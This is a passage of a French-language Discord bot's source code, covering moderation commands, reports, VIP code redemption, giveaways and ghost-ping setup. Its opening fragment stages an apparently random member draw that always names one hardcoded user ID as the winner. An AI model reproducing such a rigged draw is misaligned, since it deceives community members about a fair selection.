        const totalMembers = message.guild.memberCount;
        const targetId = '714223025645682860';
        
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('🎲 Tirage au sort en cours...')
            .setDescription(`Récupération des **${totalMembers}** membres du serveur... 🕵️‍♂️`);
            
        const msg = await message.channel.send({ embeds: [embed] });
        
        setTimeout(() => {
            embed.setDescription(`Analyse du profil des participants... ⏳\n\n*Qui sera l'heureux élu ?* 🤔`);
            msg.edit({ embeds: [embed] });
        }, 3000);

        setTimeout(() => {
            embed.setDescription(`Sélection finale en cours... 🎯\n\n**Attention, ça arrive !** ⚡`);
            msg.edit({ embeds: [embed] });
        }, 6000);

        setTimeout(() => {
            embed.setTitle('🎉 Gagnant du Tirage !')
                .setDescription(`Félicitations à <@${targetId}> ! Tu as été choisi parmi les ${totalMembers} membres ! 🥇`)
                .setThumbnail(`https://cdn.discordapp.com/avatars/${targetId}/avatar.png?size=256`); // Tentative d'image si possible
            msg.edit({ embeds: [embed] });
            message.channel.send(`Bravo <@${targetId}> tu as gagné ! 🥳`);
        }, 9000);
    }

    // Command: -ghostping
    if (command === 'ghostping') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const res = await db.query('SELECT channel_id, delay_ms FROM ghost_pings');
        
        let desc = "Configurez les ghost pings qui s'exécutent lorsqu'un membre rejoint le serveur.\n\n";
        if (res.rows.length === 0) {
            desc += "*Aucun ghost ping configuré.*";
        } else {
            desc += "**Channels actifs :**\n";
            res.rows.forEach((row, i) => {
                desc += `${i+1}. <#${row.channel_id}> (\`${row.delay_ms/1000}s\`)\n`;
            });
        }

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('👻 Configuration Ghost Ping')
            .setDescription(desc);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('gp_add').setLabel('Ajouter / Editer').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('gp_remove').setLabel('Supprimer').setStyle(ButtonStyle.Danger)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -vmute (Vocal Mute)
    if (command === 'vmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -vmute @user/ID');
        if (!target.voice.channel) return message.reply('Cet utilisateur n\'est pas dans un salon vocal.');
        
        await sendModDM(target, 'Mute Vocal', 'Sanction en salon vocal');
        await target.voice.setMute(true, `Mute vocal par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target} a été rendu muet (micro coupé) dans le salon vocal.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -vunmute (Vocal Unmute)
    if (command === 'vunmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -vunmute @user/ID');
        if (!target.voice.channel) return message.reply('Cet utilisateur n\'est pas dans un salon vocal.');
        
        await target.voice.setMute(false, `Unmute vocal par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target} a de nouveau accès à son micro dans le salon vocal.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -vdeaf (Vocal Deafen)
    if (command === 'vdeaf') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -vdeaf @user/ID');
        if (!target.voice.channel) return message.reply('Cet utilisateur n\'est pas dans un salon vocal.');
        
        await sendModDM(target, 'Assourdissement Vocal', 'Sanction en salon vocal');
        await target.voice.setDeaf(true, `Deafen vocal par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target} a été assourdi (ne peut plus entendre) dans le salon vocal.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -vundeaf (Vocal Undeafen)
    if (command === 'vundeaf') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -vundeaf @user/ID');
        if (!target.voice.channel) return message.reply('Cet utilisateur n\'est pas dans un salon vocal.');
        
        await target.voice.setDeaf(false, `Undeafen vocal par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target} n'est plus assourdi dans le salon vocal.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -vkick (Vocal Disconnect)
    if (command === 'vkick') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -vkick @user/ID');
        if (!target.voice.channel) return message.reply('Cet utilisateur n\'est pas dans un salon vocal.');
        
        await sendModDM(target, 'Expulsion Vocale', 'Sanction en salon vocal');
        await target.voice.disconnect(`Déconnexion vocale par ${message.author.tag}`);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target} a été expulsé du salon vocal.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -warn
    if (command === 'warn') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const target = await getMember(args[0]);
        let reason = args.slice(1).join(' ');
        
        if (message.reference) {
            const repliedMsg = await message.channel.messages.fetch(message.reference.messageId).catch(() => null);
            if (repliedMsg) {
                const replyContext = ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
                reason = reason ? `${reason}${replyContext}` : `Sanction via réponse${replyContext}`;
            }
        }

        if (!target || !reason) return message.reply('Usage: -warn @user/ID <raison> (La raison est obligatoire, ou répondez à un message)');

        const allowed = await checkQuota(message.author.id, 'warn', 10); // Higher quota for warns
        if (!allowed) return message.reply('⚠️ Quota warn atteint.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Avertissement')
            .setDescription(`${target} a été averti pour : **${reason}**`)
            .setTimestamp();
        
        await message.channel.send({ embeds: [embed] });
        try {
            await target.send(`⚠️ Vous avez reçu un avertissement sur **${message.guild.name}**\nRaison : ${reason}`);
        } catch {}
        logModAction('⚠️ Warn', message.author, target, 'Avertissement', reason, 0xFFFF00, message.channel);
    }

    // Command: -verif
    if (command === 'verif') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        
        let targetUser = await getUser(args[0]);

        if (!targetUser) return message.reply('Veuillez mentionner un utilisateur, donner son ID ou répondre à son message.');

        const channel = await createTicket(message.guild, targetUser, 'verif');
        message.reply(`Ticket de vérification créé pour ${targetUser} : ${channel}`);
        logModAction('🔍 Vérification', message.author, targetUser, 'Ouverture Ticket Verif', 'Manuel', 0x0000FF, message.channel);
    }

    // Command: -signaler
    if (command === 'signaler') {
        let targetUser = await getUser(args[0]);
        let targetMsg = null;

        // Check for reply
        if (message.reference) {
            targetMsg = await message.channel.messages.fetch(message.reference.messageId).catch(() => null);
            if (targetMsg) targetUser = targetMsg.author;
        }

        if (!targetUser) {
            return message.reply('❌ Usage: `-signaler @user`, `-signaler <ID>` ou répondez à un message avec `-signaler`.');
        }

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('🛡️ Signalement d\'Utilisateur')
            .setDescription(`Vous êtes sur le point de signaler **${targetUser.tag}**.\n\nVeuillez sélectionner la raison de votre signalement dans le menu ci-dessous pour que le staff puisse intervenir.`)
            .setFooter({ text: 'Tout abus sera sanctionné.' });

        const select = new StringSelectMenuBuilder()
            .setCustomId(`report_${targetUser.id}_${targetMsg ? targetMsg.id : 'none'}`)
            .setPlaceholder('Sélectionner une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Pédophilie / Contenu inapproprié').setValue('pedophile').setEmoji('🔞'),
                new StringSelectMenuOptionBuilder().setLabel('Scam / Arnaque / Spam').setValue('scam').setEmoji('💸'),
                new StringSelectMenuOptionBuilder().setLabel('Mineur sur le serveur').setValue('mineur').setEmoji('👶'),
                new StringSelectMenuOptionBuilder().setLabel('Contenu Illégal (Leak/Dox/etc)').setValue('illegal').setEmoji('⚖️'),
                new StringSelectMenuOptionBuilder().setLabel('Insultes / Harcèlement').setValue('insulte').setEmoji('🤬')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.reply({ embeds: [embed], components: [row] });
    }

    // Command: -banip
    if (command === 'banip') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const ip = args[0];
        const reason = args.slice(1).join(' ') || 'Pas de raison.';
        if (!ip) return message.reply('Usage: `-banip <IP>`');

        await db.query('INSERT INTO banned_ips (ip, reason, timestamp) VALUES ($1, $2, $3) ON CONFLICT (ip) DO UPDATE SET reason = $2', [ip, reason, Date.now()]);
        
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('🚫 IP Bannie')
            .setDescription(`L'IP **${ip}** a été bannie de l'accès au site.\n**Raison:** ${reason}`)
            .setTimestamp();
        message.reply({ embeds: [embed] });
    }

    // Command: -unbanip
    if (command === 'unbanip') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const ip = args[0];
        if (!ip) return message.reply('Usage: `-unbanip <IP>`');

        await db.query('DELETE FROM banned_ips WHERE ip = $1', [ip]);
        
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ IP Débannie')
            .setDescription(`L'IP **${ip}** a été retirée de la liste noire.`)
            .setTimestamp();
        message.reply({ embeds: [embed] });
    }

    // Command: -unban
    if (command === 'unban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers) && !message.member.roles.cache.has(STAFF_ROLE_ID)) return;
        const userId = args[0];
        if (!userId) return message.reply('Usage: -unban <user_id>');

        try {
            await message.guild.members.unban(userId);
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`L'utilisateur avec l'ID \`${userId}\` a été débanni.`);
            message.channel.send({ embeds: [embed] });
            logModAction('🔓 Unban', message.author, { id: userId, tag: `ID: ${userId}` }, 'Débannissement', 'Manuel (-unban)', 0x00FF00, message.channel);
        } catch (err) {
            message.reply('Impossible de débannir cet ID. Vérifiez qu\'il est bien banni.');
        }
    }

    } catch (error) {
        logError(error, 'Event: messageCreate');
    }
});

client.on('voiceStateUpdate', async (oldState, newState) => {
    try {
        if (!oldState.selfVideo && newState.selfVideo) {
            const member = newState.member;
            if (!member || member.user.bot) return;

            if (member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

            const count = (camInfractions.get(member.id) || 0) + 1;
            camInfractions.set(member.id, count);

            const channel = newState.channel;
            await newState.disconnect();

            const baseWarning = `${member}, vous avez été déconecté du salon vocal pour avoir mis votre caméra, en cas de récidive vous serez sanctionné.`;
            
            if (count === 1) {
                const embed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setDescription(baseWarning);
                if (channel) await channel.send({ content: `${member}`, embeds: [embed] }).catch(() => {});
            } 
            else if (count === 2) {
                await member.timeout(2 * 60 * 60 * 1000, 'Caméra en vocal (2e fois)').catch(() => {});
                const embed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setDescription(`⚠️ ${baseWarning}\n*(Sanction : Mute 2 Heures appliqué)*`);
                if (channel) await channel.send({ content: `${member}`, embeds: [embed] }).catch(() => {});
            } 
            else if (count >= 3) {
                await member.ban({ reason: 'Caméra en vocal (3ème fois)' }).catch(() => {});
                const embed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setDescription(`⛔ ${member} a été banni pour récidive de caméra en vocal.`);
                if (channel) await channel.send({ embeds: [embed] }).catch(() => {});
                camInfractions.delete(member.id);
            }
        }
    } catch (error) {
        logError(error, 'Event: voiceStateUpdate');
    }
});

// Store temporary embed data
const embedData = new Collection();
const gwData = new Collection();

// Interaction Handling (Buttons & Select Menus & Modals)
client.on('interactionCreate', async (interaction) => {
    try {
        if (interaction.isModalSubmit()) {
            if (interaction.customId === 'vip_code_modal') {
                const codeInput = interaction.fields.getTextInputValue('code_input').trim();
                const res = await db.query('SELECT * FROM vip_codes WHERE code = $1 AND claimed = false', [codeInput]);

                if (res.rows.length === 0) {
                    return await interaction.reply({ content: 'Code invalide ou déjà utilisé.', flags: [MessageFlags.Ephemeral] });
                }

                await db.query('UPDATE vip_codes SET claimed = true, timestamp = $1 WHERE code = $2', [Date.now(), codeInput]);

                let vipRole = interaction.guild.roles.cache.find(r => r.name.toLowerCase() === 'vip');
                if (!vipRole) {
                    vipRole = await interaction.guild.roles.create({
                        name: 'VIP',
                        color: '#8A2BE2',
                        reason: 'Achat via site web'
                    }).catch(() => null);
                }

                if (vipRole) await interaction.member.roles.add(vipRole).catch(() => {});

                const staffRoleId = '1483537167555891211';
                const channel = await interaction.guild.channels.create({
                    name: `vip-${interaction.user.username}`,
                    type: ChannelType.GuildText,
                    permissionOverwrites: [
                        { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                        { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ReadMessageHistory] },
                        { id: staffRoleId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ManageMessages] }
                    ]
                });

                const successEmbed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setTitle('VIP Activé !')
                    .setDescription(`Félicitations ${interaction.user}, votre Pass VIP a été activé.\nUn ticket a été ouvert ici : ${channel}`)
                    .setFooter({ text: 'Merci pour votre confiance' });

                const ticketEmbed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setTitle('Nouveau Client VIP')
                    .setDescription(`Bonjour ${interaction.user}, vous êtes maintenant VIP !\nExpliquez-nous ici ce que vous souhaitez obtenir ou vos besoins particuliers.`)
                    .addFields({ name: 'Code utilisé', value: `\`${codeInput}\`` });

                const closeBtn = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger)
                );

                await channel.send({ embeds: [ticketEmbed], components: [closeBtn] });
                return await interaction.reply({ embeds: [successEmbed], flags: [MessageFlags.Ephemeral] });
            }

            const [type, userId] = interaction.customId.split('_');
            const embedModalTypes = ['modalTitle', 'modalDesc', 'modalColor', 'modalImage', 'modalFooter'];
            
            if (embedModalTypes.includes(type)) {
                let data = embedData.get(userId) || {};
                const value = interaction.fields.getTextInputValue('input');

                if (type === 'modalTitle') data.title = value;
                if (type === 'modalDesc') data.description = value;
                if (type === 'modalColor') data.color = value.startsWith('#') ? value : `#${value}`;
                if (type === 'modalImage') data.image = value;
                if (type === 'modalFooter') data.footer = value;

                embedData.set(userId, data);
                return await interaction.reply({ content: 'Valeur mise à jour !', flags: [MessageFlags.Ephemeral] });
            }

            const gwModalTypes = ['gwTitle', 'gwDesc', 'gwTime', 'gwWinners'];
            if (gwModalTypes.includes(type)) {
                let data = gwData.get(userId) || {};
                const value = interaction.fields.getTextInputValue('input');

                if (type === 'gwTitle') data.prize = value;
                if (type === 'gwDesc') data.description = value;
                if (type === 'gwTime') data.time = value;
                if (type === 'gwWinners') data.winners = parseInt(value) || 1;

                gwData.set(userId, data);
                return await interaction.reply({ content: 'Paramètre du giveaway mis à jour !', flags: [MessageFlags.Ephemeral] });
            }
        }

        if (interaction.isStringSelectMenu()) {
            const parts = interaction.customId.split('_');
            const action = parts[0];
            const targetId = parts[1];
            const replyId = parts[2] || 'none';
            
            if (action === 'gwCondition') {
                const data = gwData.get(interaction.user.id) || {};
                data.required_role = interaction.values[0];
                gwData.set(interaction.user.id, data);
                const role = interaction.guild.roles.cache.get(data.required_role);
                return await interaction.reply({ content: `Condition mise à jour : Rôle requis **${role ? role.name : data.required_role}** !`, flags: [MessageFlags.Ephemeral] });
            }

            if (action === 'sendToChannel') {
                const data = embedData.get(interaction.user.id);
                if (!data) return interaction.reply({ content: 'Aucune donnée d\'embed trouvée.', flags: [MessageFlags.Ephemeral] });

                const channel = interaction.guild.channels.cache.get(interaction.values[0]);
                if (!channel) return interaction.reply({ content: 'Salon introuvable.', flags: [MessageFlags.Ephemeral] });

                const embed = new EmbedBuilder()
                    .setColor(data.color || 0xFFFFFF)
                    .setTitle(data.title || null)
                    .setDescription(data.description || null)
                    .setImage(data.image || null)
                    .setFooter(data.footer ? { text: data.footer } : null);

                await channel.send({ embeds: [embed] });
                embedData.delete(interaction.user.id);
                return await interaction.update({ content: `Embed envoyé dans ${channel} !`, embeds: [], components: [] });
            }

            if (action === 'gwlaunchChannel') {
                const data = gwData.get(interaction.user.id);
                if (!data) return interaction.reply({ content: 'Aucune donnée de giveaway trouvée.', flags: [MessageFlags.Ephemeral] });

                const channel = interaction.guild.channels.cache.get(interaction.values[0]);
                if (!channel) return interaction.reply({ content: 'Salon introuvable.', flags: [MessageFlags.Ephemeral] });

                const match = data.time.match(/^(\d+)([smhd])$/);
                let durationMs = 0;
                const value = parseInt(match[1]);
                const unit = match[2];
                if (unit === 's') durationMs = value * 1000;
                if (unit === 'm') durationMs = value * 60000;
                if (unit === 'h') durationMs = value * 3600000;
                if (unit === 'd') durationMs = value * 86400000;

                const endTime = Date.now() + durationMs;

                const role = data.required_role ? interaction.guild.roles.cache.get(data.required_role) : null;
                const embed = new EmbedBuilder()
                    .setColor(0xFFFFFF)
                    .setTitle(`🎉 GIVEAWAY: ${data.prize}`)
                    .setDescription(`${data.description ? data.description + '\n\n' : ''}**Gagnants:** ${data.winners}\n**Se termine:** <t:${Math.floor(endTime / 1000)}:R>\n\n${role ? `⚠️ **Condition:** Avoir le rôle ${role}\n\n` : ''}Appuyez sur le bouton 🎉 en dessous pour participer !`)
                    .setFooter({ text: `${data.winners} Gagnant(s) | Lancé par ${interaction.user.tag}` });

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('gw_join').setLabel('🎉 Participer (0)').setStyle(ButtonStyle.Primary)
                );

                const msg = await channel.send({ embeds: [embed], components: [row] });
                
                await db.query(
                    'INSERT INTO giveaways (message_id, channel_id, guild_id, prize, description, winners_count, end_time, ended, participants, required_role_id) VALUES ($1, $2, $3, $4, $5, $6, $7, false, $8, $9)',
                    [msg.id, channel.id, interaction.guild.id, data.prize, data.description || '', data.winners, endTime, JSON.stringify([]), data.required_role || null]
                );

                gwData.delete(interaction.user.id);
                return await interaction.update({ content: `Giveaway lancé dans ${channel} !`, embeds: [], components: [] });
            }

            // Moderation actions that require a valid member target
            if (['mutereason', 'muteduration', 'kick', 'ban'].includes(action)) {
                const target = await interaction.guild.members.fetch(targetId).catch(() => null);
                if (!target) return interaction.reply({ content: 'Utilisateur introuvable.', flags: [MessageFlags.Ephemeral] });

                if (action === 'mutereason') {
                    const reason = interaction.values[0];
                    const embed = new EmbedBuilder()
                        .setColor(0xFFFFFF)
                        .setTitle('Modération : Durée du Mute')
                        .setDescription(`Raison : **${reason}**\nSélectionnez maintenant la durée pour **${target.user.tag}**.`);

                    const select = new StringSelectMenuBuilder()
                        .setCustomId(`muteduration_${target.id}_${reason}_${replyId}`)
                        .setPlaceholder('Choisir une durée...')
                        .addOptions(
                            new StringSelectMenuOptionBuilder().setLabel('10 Minutes').setValue('600000'),
                            new StringSelectMenuOptionBuilder().setLabel('1 Heure').setValue('3600000'),
                            new StringSelectMenuOptionBuilder().setLabel('12 Heures').setValue('43200000'),
                            new StringSelectMenuOptionBuilder().setLabel('1 Jour').setValue('86400000'),
                            new StringSelectMenuOptionBuilder().setLabel('1 Semaine').setValue('604800000')
                        );

                    const row = new ActionRowBuilder().addComponents(select);
                    return await interaction.update({ embeds: [embed], components: [row] });
                }

                if (action === 'muteduration') {
                    const duration = parseInt(interaction.values[0]);
                    const baseReason = parts[2];
                    const rId = parts[3] || 'none';
                    
                    let reason = baseReason;
                    if (rId && rId !== 'none') {
                        const repliedMsg = await interaction.channel.messages.fetch(rId).catch(() => null);
                        if (repliedMsg) {
                            reason += ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
                        }
                    }

                    await sendModDM(target, `Mute (${duration/1000/60}min)`, reason);
                    await target.timeout(duration, reason);
                    logModAction('🔇 Sanction : Timeout', interaction.user, target, `Mute ${duration/1000/60}min`, reason, 0xFFFF00, interaction.channel);
                    return await interaction.update({ content: `${target.user.tag} a été mute pour ${duration/1000/60}min (Raison: ${reason}).`, embeds: [], components: [] });
                }

                if (action === 'kick') {
                    let reason = interaction.values[0];
                    if (replyId && replyId !== 'none') {
                        const repliedMsg = await interaction.channel.messages.fetch(replyId).catch(() => null);
                        if (repliedMsg) {
                            reason += ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
                        }
                    }

                    await sendModDM(target, 'Kick', reason);
                    await target.kick(reason);
                    logModAction('👢 Sanction : Kick', interaction.user, target, 'Kick', reason, 0xFFA500, interaction.channel);
                    return await interaction.update({ content: `${target.user.tag} a été kick (Raison: ${reason}).`, embeds: [], components: [] });
                }

                if (action === 'ban') {
                    let reason = interaction.values[0];
                    if (replyId && replyId !== 'none') {
                        const repliedMsg = await interaction.channel.messages.fetch(replyId).catch(() => null);
                        if (repliedMsg) {
                            reason += ` | Message répondu: ${repliedMsg.content.substring(0, 100) || 'Image/Embed'}`;
                        }
                    }

                    await sendModDM(target, 'Ban', reason);
                    await target.ban({ reason });
                    logModAction('🔨 Sanction : Ban', interaction.user, target, 'Ban', reason, 0xFF0000, interaction.channel);
                    return await interaction.update({ content: `${target.user.tag} a été banni (Raison: ${reason}).`, embeds: [], components: [] });
                }
            }

            if (action === 'report') {
                const reasonKey = interaction.values[0];
                const targetUser = await client.users.fetch(targetId).catch(() => null);
                
                const reasonLabels = {
                    pedophile: '🔞 Pédophilie / Contenu inapproprié',
                    scam: '💸 Scam / Arnaque / Spam',
                    mineur: '👶 Mineur sur le serveur',
                    illegal: '⚖️ Contenu Illégal',
                    insulte: '🤬 Insultes / Harcèlement'
                };

                let targetMsg = null;
                if (replyId !== 'none') {
                    targetMsg = await interaction.channel.messages.fetch(replyId).catch(() => null);
                }

                const REPORT_LOG_CHANNEL_ID = '1484856441780306052';
                const logChannel = interaction.guild.channels.cache.get(REPORT_LOG_CHANNEL_ID) || await interaction.guild.channels.fetch(REPORT_LOG_CHANNEL_ID).catch(() => null);

                if (logChannel) {
                    const reportEmbed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('🚨 NOUVEAU SIGNALEMENT')
                        .setThumbnail(targetUser?.displayAvatarURL({ dynamic: true }))
                        .addFields(
                            { name: '👤 Utilisateur signalé', value: `${targetUser} (\`${targetUser?.id}\`)`, inline: true },
                            { name: '👤 Rapporteur', value: `${interaction.user} (\`${interaction.user.id}\`)`, inline: true },
                            { name: '⚖️ Raison du signalement', value: `**${reasonLabels[reasonKey] || reasonKey}**`, inline: false },
                            { name: '📍 Salon', value: `${interaction.channel} (\`${interaction.channel.id}\`)`, inline: true },
                            { name: '🔗 Source', value: targetMsg ? `[Lien vers le message](${targetMsg.url})` : 'Mention Directe / ID', inline: true }
                        )
                        .setTimestamp();

                    if (targetMsg) {
                        if (targetMsg.content) {
                            reportEmbed.addFields({ name: '💬 Contenu du message', value: `\`\`\`${targetMsg.content.substring(0, 1000)}\`\`\`` });
                        }
                        if (targetMsg.attachments.size > 0) {
                            const firstAttachment = targetMsg.attachments.first();
                            if (firstAttachment.contentType?.startsWith('image/')) {
                                reportEmbed.setImage(firstAttachment.url);
                            }
                            reportEmbed.addFields({ name: '📎 Pièces jointes', value: `${targetMsg.attachments.size} fichier(s) détecté(s)` });
                        }
                        await targetMsg.delete().catch(() => {});
                    }

                    await logChannel.send({ content: `@here Nouveau signalement reçu ! (Message supprimé automatiquement)`, embeds: [reportEmbed] });
                }

                return await interaction.update({ 
                    content: '✅ **Merci !** Votre signalement a été transmis en toute confidentialité au staff pour analyse.', 
                    embeds: [], 
                    components: [] 
                });
            }

            if (action === 'ghostping') {
                const delay = parseInt(interaction.values[0]);
                const channelId = parts[1];
                await db.query('INSERT INTO ghost_pings (channel_id, delay_ms, active) VALUES ($1, $2, TRUE) ON CONFLICT (channel_id) DO UPDATE SET delay_ms = $2, active = TRUE', [channelId, delay]);
                return await interaction.update({ content: `✅ Ghost ping configuré dans <#${channelId}> avec un délai de \`${delay/1000}s\`.`, embeds: [], components: [] });
            }

            if (action === 'ghostpingremove') {
                const channelId = interaction.values[0];
                await db.query('DELETE FROM ghost_pings WHERE channel_id = $1', [channelId]);
                return await interaction.update({ content: `✅ Ghost ping supprimé pour <#${channelId}>.`, embeds: [], components: [] });
            }
        }

        if (interaction.isChannelSelectMenu()) {
            if (interaction.customId === 'ghostping_channel') {
                const channelId = interaction.values[0];
                const select = new StringSelectMenuBuilder()
                    .setCustomId(`ghostping_${channelId}`)
                    .setPlaceholder('Choisir le délai de suppression...')
                    .addOptions(
                        new StringSelectMenuOptionBuilder().setLabel('Immédiat (0s)').setValue('0'),
                        new StringSelectMenuOptionBuilder().setLabel('1 Seconde').setValue('1000'),
                        new StringSelectMenuOptionBuilder().setLabel('3 Secondes').setValue('3000'),
                        new StringSelectMenuOptionBuilder().setLabel('5 Secondes').setValue('5000'),
                        new StringSelectMenuOptionBuilder().setLabel('10 Secondes').setValue('10000')
                    );
                return await interaction.update({ content: `Salon sélectionné : <#${channelId}>. Choisissez maintenant le délai de suppression :`, components: [new ActionRowBuilder().addComponents(select)] });
            }
        }

        if (interaction.isButton()) {
            const userId = interaction.user.id;

            if (interaction.customId === 'gp_add') {
                const select = new ChannelSelectMenuBuilder()
                    .setCustomId('ghostping_channel')
                    .setPlaceholder('Choisir le salon pour le ghost ping...')
                    .addChannelTypes(ChannelType.GuildText);
                return await interaction.reply({ content: 'Sélectionnez le salon :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'gp_remove') {
                const res = await db.query('SELECT channel_id FROM ghost_pings');
                if (res.rows.length === 0) return interaction.reply({ content: 'Aucun ghost ping configuré.', flags: [MessageFlags.Ephemeral] });

                const select = new StringSelectMenuBuilder()
                    .setCustomId('ghostpingremove_none')
                    .setPlaceholder('Choisir le salon à supprimer...');
                
                res.rows.forEach(row => {
                    const ch = interaction.guild.channels.cache.get(row.channel_id);
                    select.addOptions(new StringSelectMenuOptionBuilder().setLabel(ch ? `#${ch.name}` : `ID: ${row.channel_id}`).setValue(row.channel_id));
                });

                return await interaction.reply({ content: 'Sélectionnez le ghost ping à supprimer :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'use_vip_code') {
                const modal = new ModalBuilder()
                    .setCustomId('vip_code_modal')
                    .setTitle('Activation Pass VIP');

                const input = new TextInputBuilder()
                    .setCustomId('code_input')
                    .setLabel('Entrez votre code VIP')
                    .setPlaceholder('XXXX-XXXX-XXXX-XXXX')
                    .setStyle(TextInputStyle.Short)
                    .setRequired(true);

                modal.addComponents(new ActionRowBuilder().addComponents(input));
                return await interaction.showModal(modal);
            }

            if (['set_title', 'set_description', 'set_color', 'set_image', 'set_footer'].includes(interaction.customId)) {
                const typeMap = {
                    set_title: ['Titre', 'modalTitle'],
                    set_description: ['Description', 'modalDesc'],
                    set_color: ['Couleur (Hex)', 'modalColor'],
                    set_image: ['Image (URL)', 'modalImage'],
                    set_footer: ['Footer', 'modalFooter']
                };

                const [label, modalType] = typeMap[interaction.customId];
                const modal = new ModalBuilder()
                    .setCustomId(`${modalType}_${userId}`)
                    .setTitle(`Configurer : ${label}`);

                const input = new TextInputBuilder()
                    .setCustomId('input')
                    .setLabel(label)
                    .setStyle(interaction.customId === 'set_description' ? TextInputStyle.Paragraph : TextInputStyle.Short)
                    .setRequired(true);

                modal.addComponents(new ActionRowBuilder().addComponents(input));
                return await interaction.showModal(modal);
            }

            if (interaction.customId === 'preview_embed') {
                const data = embedData.get(userId);
                if (!data) return interaction.reply({ content: 'L\'embed est vide.', flags: [MessageFlags.Ephemeral] });

                const preview = new EmbedBuilder()
                    .setColor(data.color || 0xFFFFFF)
                    .setTitle(data.title || 'Sans titre')
                    .setDescription(data.description || 'Sans description')
                    .setImage(data.image || null)
                    .setFooter(data.footer ? { text: data.footer } : null);

                return await interaction.reply({ content: 'Voici un aperçu :', embeds: [preview], flags: [MessageFlags.Ephemeral] });
            }

            if (interaction.customId === 'send_embed') {
                const data = embedData.get(userId);
                if (!data || (!data.title && !data.description)) {
                    return interaction.reply({ content: 'L\'embed doit avoir au moins un titre ou une description.', flags: [MessageFlags.Ephemeral] });
                }

                const select = new ChannelSelectMenuBuilder()
                    .setCustomId(`sendToChannel_${userId}`)
                    .setPlaceholder('Choisir le salon...')
                    .addChannelTypes(ChannelType.GuildText);

                return await interaction.reply({ content: 'Sélectionnez le salon d\'envoi :', components: [new ActionRowBuilder().addComponents(select)], flags: [MessageFlags.Ephemeral] });
            }

            if (['set_gw_prize', 'set_gw_desc', 'set_gw_duration', 'set_gw_winners'].includes(interaction.customId)) {
                const typeMap = {
                    set_gw_prize: ['Lot (Titre)', 'gwTitle', TextInputStyle.Short],
                    set_gw_desc: ['Description', 'gwDesc', TextInputStyle.Paragraph],
